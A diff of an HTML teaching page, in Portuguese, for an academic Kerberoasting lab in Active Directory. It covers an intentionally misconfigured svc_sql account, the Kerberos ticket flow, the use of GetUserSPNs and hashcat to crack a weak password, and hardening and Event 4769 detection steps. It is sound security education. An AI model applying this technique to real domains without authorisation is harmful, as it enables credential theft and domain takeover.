+    <line x1="60" y1="10" x2="60" y2="40" stroke="#c9a84c" stroke-width="2"/>
+    <polygon points="60,10 76,18 60,26" fill="#c9a84c" opacity=".9"/>
+  </svg>
+  <p class="eyebrow">🛡️ Laboratório de Segurança &nbsp;·&nbsp; Active Directory</p>
+  <h1>Operação <span>Kerberos</span></h1>
+  <p class="hero-sub">Uma missão de infiltração no domínio <code>lab.local</code>. A conta de alice foi comprometida — e agora está sendo usada como porta de entrada. Aprenda como o ataque funciona e como defender o castelo.</p>
+  <div class="progress-bar-wrap"><div id="progress-fill"></div></div>
+  <p class="progress-label" id="progress-text">MISSÃO: 0% concluída</p>
+  <button class="reset-progress" type="button" onclick="restart()">Reiniciar progresso</button>
+</div>
+
+<!-- ════════════════ NAV ════════════════ -->
+<div id="phase-nav">
+  <button class="phase-btn active" data-phase="0" onclick="goPhase(0)">🏰 Ambiente</button>
+  <button class="phase-btn locked" data-phase="1" onclick="goPhase(1)">⚔️ Conceito</button>
+  <button class="phase-btn locked" data-phase="2" onclick="goPhase(2)">🗝️ Ataque</button>
+  <button class="phase-btn locked" data-phase="3" onclick="goPhase(3)">🔓 Hash Cracking</button>
+  <button class="phase-btn locked" data-phase="4" onclick="goPhase(4)">🛡️ Hardening</button>
+  <button class="phase-btn locked" data-phase="5" onclick="goPhase(5)">🏆 Vitória</button>
+</div>
+
+<div class="wrap">
+
+<!-- ════════════════════════════════════
+     FASE 0 — AMBIENTE
+════════════════════════════════════ -->
+<section class="phase active" id="phase-0">
+  <div class="phase-header">
+    <p class="phase-number">Fase I · Reconhecimento</p>
+    <h2>O Castelo do Domínio</h2>
+    <p class="phase-desc">Antes de qualquer operação, conheça o território. Este é o ambiente do laboratório.</p>
   </div>
 
-  <main class="deck">
-    <section class="slide active">
-      <header>
-        <div class="kicker">Laboratorio academico</div>
-        <h1>Kerberoasting em Active Directory e Hardening</h1>
-      </header>
-      <div class="content split">
-        <div>
-          <p>Demonstracao em ambiente controlado usando Windows Server como Domain Controller e Kali como maquina de teste.</p>
-          <div class="note">Ideia central: uma conta comum pode solicitar ticket Kerberos para uma conta de servico com SPN. Se a senha for fraca, o hash pode ser quebrado offline.</div>
-        </div>
-        <div class="evidence">
-          <img src="../documentacao/prints/00-hyperv-duas-vms.png" alt="Hyper-V com Windows Server e Kali">
-        </div>
-      </div>
-      <footer><span>Ambiente</span><span class="counter"></span></footer>
-    </section>
+  <div class="chars">
+    <div class="char-card">
+      <div class="char-icon">🏰</div>
+      <div class="char-name">lab.local</div>
+      <div class="char-role">Domínio AD</div>
+    </div>
+    <div class="char-card">
+      <div class="char-icon">👑</div>
+      <div class="char-name">Win Server</div>
+      <div class="char-role">Domain Controller<br>172.24.173.229</div>
+    </div>
+    <div class="char-card">
+      <div class="char-icon">🐉</div>
+      <div class="char-name">Kali Linux</div>
+      <div class="char-role">Máquina do atacante real</div>
+    </div>
+    <div class="char-card">
+      <div class="char-icon">🕵️</div>
+      <div class="char-name">alice</div>
+      <div class="char-role">Vítima: conta comprometida<br>via phishing / senha fraca</div>
+    </div>
+    <div class="char-card">
+      <div class="char-icon">⚠️</div>
+      <div class="char-name">svc_sql</div>
+      <div class="char-role">Conta de serviço<br>vulnerável</div>
+    </div>
+  </div>
 
-    <section class="slide">
-      <header>
-        <div class="kicker">Conceito</div>
-        <h2>O que é Kerberoasting?</h2>
-      </header>
-      <div class="content">
-        <div class="note">Analogia: Alice é uma funcionária comum. Ela pede na recepção um crachá para visitar a sala do SQL. O crachá é válido, mas foi protegido com uma chave baseada na senha da conta de serviço.</div>
-        <ul>
-          <li>Funcionário comum: <b>alice</b></li>
-          <li>Recepção: <b>Domain Controller</b></li>
-          <li>Sala/serviço: <b>MSSQLSvc/sql.lab.local:1433</b></li>
-          <li>Responsável pela sala: <b>svc_sql</b></li>
-          <li>Crachá temporário: <b>ticket Kerberos TGS</b></li>
-        </ul>
-      </div>
-      <footer><span>Conceito</span><span class="counter"></span></footer>
-    </section>
+  <div class="card">
+    <div class="card-title"><span class="icon">📋</span> Inventário do Alvo</div>
+    <table>
+      <tr><th>Item</th><th>Valor</th><th>Risco</th></tr>
+      <tr>
+        <td>Domínio</td>
+        <td><code>lab.local</code></td>
+        <td><span class="risk-badge risk-ok">● NEUTRO</span></td>
+      </tr>
+      <tr>
+        <td>Conta de serviço</td>
+        <td><code>svc_sql</code></td>
+        <td><span class="risk-badge risk-critical">● CRÍTICO</span></td>
+      </tr>
+      <tr>
+        <td>SPN configurado</td>
+        <td><code>MSSQLSvc/sql.lab.local:1433</code><br><span style="font-size:11px; color: var(--muted);">Etiqueta que anuncia o serviço SQL Server no domínio</span></td>
+        <td><span class="risk-badge risk-medium">● OBSERVAR</span></td>
+      </tr>
+      <tr>
+        <td>Senha de svc_sql</td>
+        <td>Fraca (<em>Password123!</em>)</td>
+        <td><span class="risk-badge risk-critical">● CRÍTICO</span></td>
+      </tr>
+      <tr>
+        <td>svc_sql nos grupos</td>
+        <td>Domain Admins 🚨</td>
+        <td><span class="risk-badge risk-critical">● CRÍTICO</span></td>
+      </tr>
+    </table>
+  </div>
 
-    <section class="slide">
-      <header>
-        <div class="kicker">Windows Server</div>
-        <h2>AD DS e DNS no Domain Controller</h2>
-      </header>
-      <div class="content split">
-        <div>
-          <p>O Windows Server atua como controlador do domínio <b>lab.local</b>.</p>
-          <p>AD DS autentica usuários e armazena objetos do domínio. DNS permite localizar serviços e o próprio DC.</p>
-        </div>
-        <div class="evidence fill">
-          <img src="../documentacao/prints/windows/01-server-manager-ad-ds-dns.png" alt="Server Manager com AD DS e DNS">
-        </div>
-      </div>
-      <footer><span>Preparação Windows</span><span class="counter"></span></footer>
-    </section>
+  <div class="evidence-section">
+    <div class="evidence-heading">Evidências reais // montagem do ambiente</div>
+    <div class="evidence-grid">
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/00-hyperv-duas-vms.png" alt="Hyper-V com as máquinas Windows Server e Kali Linux" data-zoomable>
+        <figcaption>Topologia do laboratório no Hyper-V: o Windows Server funciona como DC e o Kali como estação de teste.</figcaption>
+      </figure>
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/windows/01-server-manager-ad-ds-dns.png" alt="Server Manager com as funções AD DS e DNS" data-zoomable>
+        <figcaption>O Domain Controller oferece AD DS e DNS, serviços centrais para autenticação e localização do domínio.</figcaption>
+      </figure>
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/windows/03-aduc-usuarios-lab.png" alt="Usuários Alice, Bob e svc_sql no Active Directory" data-zoomable>
+        <figcaption>Objetos usados no cenário: Alice e Bob como usuários e svc_sql como conta de serviço.</figcaption>
+      </figure>
+    </div>
+  </div>
 
-    <section class="slide">
-      <header>
-        <div class="kicker">Windows Server</div>
-        <h2>Usuários do laboratório</h2>
-      </header>
-      <div class="content split">
-        <div>
-          <ul>
-            <li><b>Alice</b>: conta comum usada no ataque.</li>
-            <li><b>bob</b>: usuário comum adicional.</li>
-            <li><b>svc_sql</b>: conta de serviço vulnerável.</li>
-          </ul>
-        </div>
-        <div class="evidence fill">
-          <img src="../documentacao/prints/windows/03-aduc-usuarios-lab.png" alt="Usuários do laboratório no ADUC">
-        </div>
-      </div>
-      <footer><span>Preparação Windows</span><span class="counter"></span></footer>
-    </section>
+  <div class="analogy">
+    <p class="analogy-title">🏰 Metáfora do Castelo</p>
+    <p>O castelo <strong>lab.local</strong> tem muros (autenticação), guardas (DC), e salas internas (serviços). Qualquer funcionário com crachá válido pode pedir acesso à sala do SQL — mas esse crachá é protegido com a chave pessoal do responsável. Se a chave for fraca, um inimigo que roubou o crachá pode abri-la em casa, no conforto da taverna.</p>
+  </div>
 
-    <section class="slide">
-      <header>
-        <div class="kicker">Falha proposital</div>
-        <h2>SPN em svc_sql</h2>
-      </header>
-      <div class="content split">
-        <div>
-          <p>O SPN identifica um serviço no Active Directory:</p>
-          <div class="code">MSSQLSvc/sql.lab.local:1433</div>
-          <p>Contas com SPN podem receber tickets Kerberos de serviço, chamados TGS.</p>
-        </div>
-        <div class="evidence fill">
-          <img src="../documentacao/prints/windows/04-svc-sql-spn.png" alt="SPN configurado em svc_sql">
-        </div>
-      </div>
-      <footer><span>Preparação Windows</span><span class="counter"></span></footer>
-    </section>
+  <button class="btn-next" onclick="completePhase(0)">Entendi o ambiente → Avançar</button>
+</section>
 
-    <section class="slide">
-      <header>
-        <div class="kicker">Falha proposital</div>
-        <h2>svc_sql em Domain Admins</h2>
-      </header>
-      <div class="content split">
-        <div>
-          <div class="note danger">Esta é a configuração insegura do laboratório. Uma conta de serviço não deveria ter privilégio administrativo no domínio.</div>
-          <p>Se a senha de <b>svc_sql</b> for descoberta, o impacto pode virar controle do domínio.</p>
-        </div>
-        <div class="evidence fill">
-          <img src="../documentacao/prints/windows/05-svc-sql-domain-admins.png" alt="svc_sql membro de Domain Admins">
-        </div>
-      </div>
-      <footer><span>Falha configurada</span><span class="counter"></span></footer>
-    </section>
+<!-- ════════════════════════════════════
+     FASE 1 — CONCEITO
+════════════════════════════════════ -->
+<section class="phase" id="phase-1">
+  <div class="phase-header">
+    <p class="phase-number">Fase II · Teoria</p>
+    <h2>O que é Kerberoasting?</h2>
+    <p class="phase-desc">Entenda o mecanismo antes de executar o ataque.</p>
+  </div>
 
-    <section class="slide">
-      <header>
-        <div class="kicker">Kali</div>
-        <h2>Conectividade com o Domain Controller</h2>
-      </header>
-      <div class="content image-only">
-        <div class="evidence fill">
-          <img src="../documentacao/prints/kali/01-ping-dc.png" alt="Ping do Kali para o DC">
-        </div>
-      </div>
-      <footer><span>Validação</span><span>0% packet loss</span></footer>
-    </section>
+  <div class="card">
+    <div class="card-title"><span class="icon">🏷️</span> O que é um SPN?</div>
+    <p style="margin-bottom: 14px;"><strong>SPN</strong> significa <em>Service Principal Name</em> — é basicamente o <strong>endereço oficial de um serviço dentro do domínio</strong>. Funciona como uma etiqueta que diz: <em>"esse serviço existe, está rodando nessa máquina, nessa porta, e pertence a essa conta."</em></p>
 
-    <section class="slide">
-      <header>
-        <div class="kicker">Kali</div>
-        <h2>DNS resolvendo lab.local</h2>
-      </header>
-      <div class="content image-only">
-        <div class="evidence fill">
-          <img src="../documentacao/prints/kali/02-nslookup-lab-local.png" alt="nslookup lab.local">
-        </div>
-      </div>
-      <footer><span>Validação</span><span>DNS do AD funcionando</span></footer>
-    </section>
+    <div class="analogy" style="margin: 14px 0;">
+      <p class="analogy-title">🏰 Metáfora</p>
+      <p>Imagine que o castelo tem várias salas. Cada sala tem uma <strong>placa na porta</strong> com o nome da sala, o número e o responsável. O SPN é essa placa. Sem placa, o DC não sabe que aquela sala (serviço) existe. Com placa, qualquer funcionário pode pedir um crachá para visitá-la.</p>
+    </div>
 
-    <section class="slide">
-      <header>
-        <div class="kicker">Kali</div>
-        <h2>Conta comum Alice consultando o domínio</h2>
-      </header>
-      <div class="content image-only">
-        <div class="evidence fill">
-          <img src="../documentacao/prints/kali/03-getadusers-alice.png" alt="GetADUsers com Alice">
-        </div>
+    <p style="margin-bottom: 12px;">No laboratório, o SPN configurado na conta <code>svc_sql</code> é:</p>
+    <div class="terminal" style="margin: 0 0 14px;">
+      <div class="terminal-bar">
+        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+        <span class="terminal-title">Formato: Serviço/Hostname:Porta</span>
       </div>
-      <footer><span>Enumeração</span><span>Alice não é admin</span></footer>
-    </section>
-
-    <section class="slide">
-      <header>
-        <div class="kicker">Kerberoasting</div>
-        <h2>GetUserSPNs encontra svc_sql</h2>
-      </header>
-      <div class="content image-only">
-        <div class="evidence fill">
-          <img src="../documentacao/prints/kali/04-getuserspns-svc-sql.png" alt="GetUserSPNs encontrando svc_sql">
-        </div>
+      <div class="terminal-body">
+        <span class="t-highlight">MSSQLSvc</span><span class="t-out">/</span><span class="t-cmd">sql.lab.local</span><span class="t-out">:</span><span class="t-ok">1433</span><br><br>
+        <span class="t-comment"># MSSQLSvc  → tipo de serviço (SQL Server)</span><br>
+        <span class="t-comment"># sql.lab.local → hostname da máquina onde roda</span><br>
+        <span class="t-comment"># 1433       → porta TCP padrão do SQL Server</span>
       </div>
-      <footer><span>Etapa central</span><span>SPN + TGS</span></footer>
-    </section>
+    </div>
 
-    <section class="slide">
-      <header>
-        <div class="kicker">Kerberoasting</div>
-        <h2>Hash Kerberos salvo</h2>
-      </header>
-      <div class="content image-only">
-        <div class="evidence fill">
-          <img src="../documentacao/prints/kali/05-hashes-txt-gerado.png" alt="hashes.txt gerado">
-        </div>
+    <table>
+      <tr><th>Pergunta</th><th>Resposta</th></tr>
+      <tr><td>Quem cria o SPN?</td><td>O administrador do domínio, ao registrar um serviço</td></tr>
+      <tr><td>Onde fica armazenado?</td><td>No atributo <code>servicePrincipalName</code> da conta no AD</td></tr>
+      <tr><td>Por que o SPN importa pro ataque?</td><td>Sem SPN, o DC não emite TGS para aquela conta — ou seja, <strong>sem SPN, não há Kerberoasting possível</strong></td></tr>
+      <tr><td>O SPN em si é o problema?</td><td>Não. O problema é SPN + senha fraca + privilégio alto <em>ao mesmo tempo</em></td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">🔐</span> Como funciona o Kerberos?</div>
+    <p style="margin-bottom: 6px;">Kerberos é o sistema de autenticação do Active Directory. Em vez de enviar a senha pela rede, ele usa <strong>tickets temporários</strong>. Clique em cada mensagem para entender o que ela faz.</p>
+    <p style="font-size: 12px; color: var(--muted); margin-bottom: 18px;">💡 Clique nas setas para ver a explicação de cada etapa</p>
+
+    <!-- DIAGRAMA SVG INTERATIVO -->
+    <div style="position:relative; overflow-x:auto;">
+    <svg id="kerb-svg" viewBox="0 0 700 340" xmlns="http://www.w3.org/2000/svg" style="width:100%; min-width:480px; font-family:'Inter',sans-serif;">
+
+      <!-- ── ATORES ── -->
+      <!-- Usuário (alice) -->
+      <g>
+        <!-- corpo -->
+        <circle cx="80" cy="60" r="22" fill="#2a3050" stroke="#4a8fe8" stroke-width="1.5"/>
+        <text x="80" y="65" text-anchor="middle" font-size="22">👩‍💻</text>
+        <text x="80" y="100" text-anchor="middle" font-size="11" fill="#7a85aa">Usuário</text>
+        <text x="80" y="114" text-anchor="middle" font-size="10" fill="#4a8fe8">(alice comprometida)</text>
+      </g>
+
+      <!-- KDC - AS -->
+      <g>
+        <rect x="490" y="10" width="90" height="70" rx="6" fill="#1e2540" stroke="#c9a84c" stroke-width="1.5"/>
+        <text x="535" y="38" text-anchor="middle" font-size="18">🔑</text>
+        <text x="535" y="58" text-anchor="middle" font-size="11" fill="#c9a84c" font-weight="700">AS</text>
+        <text x="535" y="72" text-anchor="middle" font-size="9" fill="#7a85aa">Auth Service</text>
+        <text x="600" y="55" text-anchor="middle" font-size="10" fill="#7a85aa">KDC</text>
+        <!-- servidores atrás -->
+        <rect x="582" y="14" width="8" height="58" rx="2" fill="#2a3050" stroke="#3a4060" stroke-width="1"/>
+        <rect x="592" y="18" width="8" height="50" rx="2" fill="#2a3050" stroke="#3a4060" stroke-width="1"/>
+      </g>
+
+      <!-- KDC - TGS -->
+      <g>
+        <rect x="490" y="100" width="90" height="70" rx="6" fill="#1e2540" stroke="#9b6ee8" stroke-width="1.5"/>
+        <text x="535" y="128" text-anchor="middle" font-size="18">🎟️</text>
+        <text x="535" y="148" text-anchor="middle" font-size="11" fill="#9b6ee8" font-weight="700">TGS</text>
+        <text x="535" y="162" text-anchor="middle" font-size="9" fill="#7a85aa">Ticket Granting</text>
+        <!-- servidores atrás -->
+        <rect x="582" y="104" width="8" height="58" rx="2" fill="#2a3050" stroke="#3a4060" stroke-width="1"/>
+        <rect x="592" y="108" width="8" height="50" rx="2" fill="#2a3050" stroke="#3a4060" stroke-width="1"/>
+      </g>
+
+      <!-- Serviço SQL -->
+      <g>
+        <ellipse cx="535" cy="270" rx="36" ry="14" fill="#1e2540" stroke="#4ecb71" stroke-width="1.5"/>
+        <ellipse cx="535" cy="255" rx="36" ry="14" fill="#1e2540" stroke="#4ecb71" stroke-width="1.5"/>
+        <ellipse cx="535" cy="240" rx="36" ry="14" fill="#1e2540" stroke="#4ecb71" stroke-width="1.5"/>
+        <text x="535" y="244" text-anchor="middle" font-size="9" fill="#4ecb71" font-weight="700">svc_sql</text>
+        <text x="535" y="290" text-anchor="middle" font-size="10" fill="#7a85aa">SQL Server</text>
+        <text x="535" y="303" text-anchor="middle" font-size="9" fill="#4ecb71">MSSQLSvc/sql.lab.local</text>
+      </g>
+
+      <!-- ── SETAS CLICÁVEIS ── -->
+
+      <!-- 1. AS_REQ: usuario → AS (seta pra direita, acima) -->
+      <g class="kerb-arrow" onclick="kerbClick(0)" style="cursor:pointer">
+        <line x1="105" y1="48" x2="485" y2="30" stroke="#4a8fe8" stroke-width="2" stroke-dasharray="0"/>
+        <polygon points="485,30 472,24 474,33" fill="#4a8fe8"/>
+        <rect x="230" y="22" width="90" height="20" rx="4" fill="#111524" stroke="#4a8fe8" stroke-width="1" opacity="0.9"/>
+        <text x="275" y="36" text-anchor="middle" font-size="11" fill="#4a8fe8" font-weight="600">① AS_REQ</text>
+      </g>
+
+      <!-- 2. AS_REP: AS → usuario (seta pra esquerda) -->
+      <g class="kerb-arrow" onclick="kerbClick(1)" style="cursor:pointer">
+        <line x1="485" y1="55" x2="108" y2="72" stroke="#c9a84c" stroke-width="2"/>
+        <polygon points="108,72 122,66 120,75" fill="#c9a84c"/>
+        <rect x="230" y="56" width="90" height="20" rx="4" fill="#111524" stroke="#c9a84c" stroke-width="1" opacity="0.9"/>
+        <text x="275" y="70" text-anchor="middle" font-size="11" fill="#c9a84c" font-weight="600">② AS_REP</text>
+      </g>
+
+      <!-- 3. TGT_REQ: usuario → TGS -->
+      <g class="kerb-arrow" onclick="kerbClick(2)" style="cursor:pointer">
+        <line x1="105" y1="82" x2="485" y2="122" stroke="#9b6ee8" stroke-width="2"/>
+        <polygon points="485,122 471,116 474,125" fill="#9b6ee8"/>
+        <rect x="225" y="90" width="116" height="20" rx="4" fill="#111524" stroke="#9b6ee8" stroke-width="1" opacity="0.9"/>
+        <text x="283" y="104" text-anchor="middle" font-size="11" fill="#9b6ee8" font-weight="600">③ TGT_REQ (TGT)</text>
+      </g>
+
+      <!-- 4. TGT_REP: TGS → usuario — ESTA É A SETA CRÍTICA -->
+      <g class="kerb-arrow" onclick="kerbClick(3)" style="cursor:pointer">
+        <line x1="485" y1="148" x2="108" y2="96" stroke="#e05555" stroke-width="2.5"/>
+        <polygon points="108,96 122,90 121,99" fill="#e05555"/>
+        <rect x="220" y="116" width="126" height="20" rx="4" fill="#1a0808" stroke="#e05555" stroke-width="1.5" opacity="0.95"/>
+        <text x="283" y="130" text-anchor="middle" font-size="11" fill="#e05555" font-weight="700">④ TGT_REP (TGS) ⚠️</text>
+      </g>
+
+      <!-- 5. AP_REQ: usuario → SQL -->
+      <g class="kerb-arrow" onclick="kerbClick(4)" style="cursor:pointer">
+        <line x1="100" y1="115" x2="498" y2="238" stroke="#4ecb71" stroke-width="2"/>
+        <polygon points="498,238 484,233 487,242" fill="#4ecb71"/>
+        <rect x="218" y="178" width="90" height="20" rx="4" fill="#111524" stroke="#4ecb71" stroke-width="1" opacity="0.9"/>
+        <text x="263" y="192" text-anchor="middle" font-size="11" fill="#4ecb71" font-weight="600">⑤ AP_REQ</text>
+      </g>
+
+      <!-- 6. AP_REP: SQL → usuario -->
+      <g class="kerb-arrow" onclick="kerbClick(5)" style="cursor:pointer">
+        <line x1="498" y1="258" x2="105" y2="130" stroke="#7a85aa" stroke-width="2"/>
+        <polygon points="105,130 118,124 118,133" fill="#7a85aa"/>
+        <rect x="218" y="215" width="90" height="20" rx="4" fill="#111524" stroke="#7a85aa" stroke-width="1" opacity="0.9"/>
+        <text x="263" y="229" text-anchor="middle" font-size="11" fill="#7a85aa" font-weight="600">⑥ AP_REP</text>
+      </g>
+
+      <!-- Linha vertical separando KDC do serviço (visual) -->
+      <line x1="470" y1="0" x2="470" y2="340" stroke="#2a3050" stroke-width="1" stroke-dasharray="4,4"/>
+
+    </svg>
+    </div>
+
+    <!-- PAINEL DE EXPLICAÇÃO -->
+    <div id="kerb-panel" style="
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin-top: 4px;
+      min-height: 80px;
+      transition: all .3s;
+    ">
+      <div id="kerb-panel-content">
+        <p style="color: var(--muted); font-size: 13px; text-align:center; margin-top: 10px;">👆 Clique em uma seta numerada para ver o que acontece naquela etapa</p>
       </div>
-      <footer><span>Extração</span><span>Formato $krb5tgs$</span></footer>
-    </section>
+    </div>
 
-    <section class="slide">
-      <header>
-        <div class="kicker">Hashcat</div>
-        <h2>Wordlist do laboratório</h2>
-      </header>
-      <div class="content image-only">
-        <div class="evidence fill">
-          <img src="../documentacao/prints/kali/06-wordlist-lab.png" alt="wordlist.txt">
-        </div>
-      </div>
-      <footer><span>Quebra offline</span><span>Lista didática</span></footer>
-    </section>
-
-    <section class="slide">
-      <header>
-        <div class="kicker">Hashcat</div>
-        <h2>Status: Cracked</h2>
-      </header>
-      <div class="content image-only">
-        <div class="evidence fill">
-          <img src="../documentacao/prints/kali/07-hashcat-cracked-password.png" alt="Hashcat cracked">
-        </div>
-      </div>
-      <footer><span>Resultado</span><span>Password123!</span></footer>
-    </section>
-
-    <section class="slide">
-      <header>
-        <div class="kicker">Hashcat</div>
-        <h2>Senha recuperada com --show</h2>
-      </header>
-      <div class="content image-only">
-        <div class="evidence fill">
-          <img src="../documentacao/prints/kali/08-hashcat-show-password.png" alt="Hashcat show password">
-        </div>
-      </div>
-      <footer><span>Prova final</span><span>svc_sql:Password123!</span></footer>
-    </section>
-
-    <section class="slide">
-      <header>
-        <div class="kicker">Impacto</div>
-        <h2>Por que isso é grave?</h2>
-      </header>
-      <div class="content">
-        <div class="note danger">O ataque começou com uma conta comum, mas terminou revelando a senha de uma conta de serviço que estava em Domain Admins.</div>
-        <div class="code">alice -> solicita TGS
-TGS -> salvo em hashes.txt
-Hashcat -> recupera Password123!
-svc_sql em Domain Admins -> impacto crítico</div>
-      </div>
-      <footer><span>Impacto</span><span>Escalação por má configuração</span></footer>
-    </section>
-
-    <section class="slide">
-      <header>
-        <div class="kicker">Hardening</div>
-        <h2>Remover svc_sql de Domain Admins</h2>
-      </header>
-      <div class="content image-only">
-        <div class="evidence fill">
-          <img src="../documentacao/prints/windows/09-hardening-remover-domain-admins.gif" alt="GIF removendo svc_sql de Domain Admins">
-        </div>
-      </div>
-      <footer><span>Menor privilégio</span><span>GIF animado</span></footer>
-    </section>
-
-    <section class="slide">
-      <header>
-        <div class="kicker">Hardening</div>
-        <h2>Resetar senha comprometida</h2>
-      </header>
-      <div class="content image-only">
-        <div class="evidence fill">
-          <img src="../documentacao/prints/windows/10-hardening-reset-senha-svc-sql.gif" alt="GIF resetando a senha da svc_sql">
-        </div>
-      </div>
-      <footer><span>Senha forte</span><span>GIF animado</span></footer>
-    </section>
-
-    <section class="slide">
-      <header>
-        <div class="kicker">Hardening</div>
-        <h2>Revisar opções da conta</h2>
-      </header>
-      <div class="content image-only">
-        <div class="evidence fill">
-          <img src="../documentacao/prints/windows/11-hardening-account-options-svc-sql.png" alt="Account options svc_sql">
-        </div>
-      </div>
-      <footer><span>Conta de serviço</span><span>Evitar exceções perigosas</span></footer>
-    </section>
-
-    <section class="slide">
-      <header>
-        <div class="kicker">Hardening</div>
-        <h2>SPN continua existindo</h2>
-      </header>
-      <div class="content split">
-        <div>
-          <p>SPN não é automaticamente uma falha.</p>
-          <p>O problema era o conjunto: <b>SPN + senha fraca + Domain Admins</b>.</p>
-        </div>
-        <div class="evidence fill">
-          <img src="../documentacao/prints/windows/12-hardening-spn-ainda-existe.png" alt="SPN ainda existe">
-        </div>
-      </div>
-      <footer><span>Hardening</span><span>Corrigir risco, não apagar o serviço</span></footer>
-    </section>
-
-    <section class="slide">
-      <header>
-        <div class="kicker">Detecção</div>
-        <h2>Event ID 4769</h2>
-      </header>
-      <div class="content split">
-        <div>
-          <p>O evento 4769 registra solicitação de ticket Kerberos de serviço, TGS.</p>
-          <p>Muitos eventos para várias contas de serviço podem indicar atividade suspeita de Kerberoasting.</p>
-        </div>
-        <div class="evidence fill">
-          <img src="../documentacao/prints/windows/13-hardening-evento-4769-kerberos.png" alt="Event Viewer 4769">
-        </div>
-      </div>
-      <footer><span>Monitoramento</span><span>4769</span></footer>
-    </section>
-
-    <section class="slide">
-      <header>
-        <div class="kicker">Conclusão</div>
-        <h2>Como corrigir o risco</h2>
-      </header>
-      <div class="content">
-        <ul>
-          <li>Remover contas de serviço de grupos privilegiados.</li>
-          <li>Usar senhas longas, aleatórias e únicas.</li>
-          <li>Preferir gMSA quando possível.</li>
-          <li>Revisar SPNs periodicamente.</li>
-          <li>Monitorar eventos Kerberos, principalmente 4769.</li>
-        </ul>
-        <div class="note">Kerberoasting mostra que o risco muitas vezes vem de configuração fraca, não de uma falha nova do Windows.</div>
-      </div>
-      <footer><span>Fim</span><span class="counter"></span></footer>
-    </section>
-  </main>
-
-  <div class="progress"><div class="bar" id="bar"></div></div>
+    <p style="color: var(--muted); font-size: 13px; margin-top: 14px;">O TGS (etapa ④) é parcialmente cifrado com o hash da senha da conta de serviço. Isso é normal — o problema começa quando o atacante <em>salva esse ticket e tenta quebrá-lo offline</em>.</p>
+  </div>
 
   <script>
-    const slides = Array.from(document.querySelectorAll(".slide"));
-    const counters = Array.from(document.querySelectorAll(".counter"));
-    const bar = document.getElementById("bar");
-    let current = 0;
+  const kerbSteps = [
+    {
+      label: '① AS_REQ — Autenticação inicial',
+      color: '#4a8fe8',
+      icon: '📤',
+      from: 'Usuário (alice)',
+      to: 'AS — Authentication Service (KDC)',
+      desc: 'O usuário envia uma requisição de autenticação ao KDC informando sua identidade. Ainda não há senha trafegando — apenas o nome do usuário e um timestamp cifrado com o hash da senha dele.',
+      lab: null,
+    },
+    {
+      label: '② AS_REP — Entrega do TGT',
+      color: '#c9a84c',
+      icon: '🎫',
+      from: 'AS (KDC)',
+      to: 'Usuário (alice)',
+      desc: 'O KDC valida o usuário e entrega um <strong>TGT (Ticket Granting Ticket)</strong> — um "passe geral" temporário que prova que o usuário está autenticado. Esse TGT é cifrado com a chave do próprio KDC, então o usuário não consegue alterá-lo.',
+      lab: null,
+    },
+    {
+      label: '③ TGT_REQ — Pedido de ticket de serviço',
+      color: '#9b6ee8',
+      icon: '🎟️',
+      from: 'Usuário (alice)',
+      to: 'TGS — Ticket Granting Service (KDC)',
+      desc: 'Com o TGT em mãos, o usuário pede um ticket específico para acessar um serviço — neste caso, o SQL Server. Ele apresenta o TGT como prova de identidade e informa o SPN do serviço desejado.',
+      lab: null,
+    },
+    {
+      label: '④ TGT_REP — Entrega do TGS ⚠️ PONTO CRÍTICO',
+      color: '#e05555',
+      icon: '💀',
+      from: 'TGS (KDC)',
+      to: 'Usuário (alice)',
+      desc: 'O KDC entrega o <strong>TGS (Ticket de Serviço)</strong> — e aqui está o problema: <strong>parte desse ticket é cifrada com o hash da senha da conta svc_sql</strong>. O KDC não questiona a intenção — qualquer usuário autenticado pode pedir esse ticket. O atacante captura esse ticket e tenta quebrar a cifra offline.',
+      lab: '🎯 No laboratório: o impacket-GetUserSPNs captura exatamente este TGS e salva em hashes.txt',
+    },
+    {
+      label: '⑤ AP_REQ — Apresenta o ticket ao serviço',
+      color: '#4ecb71',
+      icon: '🚪',
+      from: 'Usuário (alice)',
+      to: 'SQL Server (svc_sql)',
+      desc: 'O usuário apresenta o TGS ao serviço real (SQL Server). O serviço consegue descriptografar o ticket com sua própria senha — e se der certo, confirma que o usuário tem permissão de acesso.',
+      lab: null,
+    },
+    {
+      label: '⑥ AP_REP — Confirmação de acesso',
+      color: '#7a85aa',
+      icon: '✅',
+      from: 'SQL Server (svc_sql)',
+      to: 'Usuário (alice)',
+      desc: 'O serviço confirma a autenticação e estabelece a sessão. O usuário agora está conectado ao SQL Server — sem que a senha tenha trafegado pela rede em nenhum momento.',
+      lab: null,
+    },
+  ];
 
-    function show(index) {
-      current = Math.max(0, Math.min(index, slides.length - 1));
-      slides.forEach((slide, idx) => slide.classList.toggle("active", idx === current));
-      counters.forEach((counter) => {
-        counter.textContent = `${current + 1}/${slides.length}`;
-      });
-      bar.style.width = `${((current + 1) / slides.length) * 100}%`;
-      location.hash = `slide-${current + 1}`;
-    }
+  function kerbClick(i) {
+    const s = kerbSteps[i];
+    document.getElementById('kerb-panel').style.borderColor = s.color;
+    document.getElementById('kerb-panel-content').innerHTML = `
+      <div style="display:flex; align-items:center; gap:10px; margin-bottom:10px;">
+        <span style="font-size:22px">${s.icon}</span>
+        <span style="font-family:'Cinzel',serif; font-size:13px; color:${s.color}; font-weight:700;">${s.label}</span>
+      </div>
+      <div style="display:flex; gap:8px; margin-bottom:10px; flex-wrap:wrap;">
+        <span style="font-size:11px; background:#111524; border:1px solid #2a3050; padding:3px 10px; border-radius:20px; color:#7a85aa;">
+          📤 <strong style="color:#d8dff5">${s.from}</strong>
+        </span>
+        <span style="font-size:16px; color:#2a3050;">→</span>
+        <span style="font-size:11px; background:#111524; border:1px solid #2a3050; padding:3px 10px; border-radius:20px; color:#7a85aa;">
+          📥 <strong style="color:#d8dff5">${s.to}</strong>
+        </span>
+      </div>
+      <p style="font-size:13px; line-height:1.7; color:#d8dff5;">${s.desc}</p>
+      ${s.lab ? `<div style="margin-top:12px; padding:10px 14px; background:rgba(224,85,85,.08); border:1px solid rgba(224,85,85,.25); border-radius:6px; font-size:12px; color:#e05555;">${s.lab}</div>` : ''}
+    `;
+  }
+  </script>
 
-    document.getElementById("prev").addEventListener("click", () => show(current - 1));
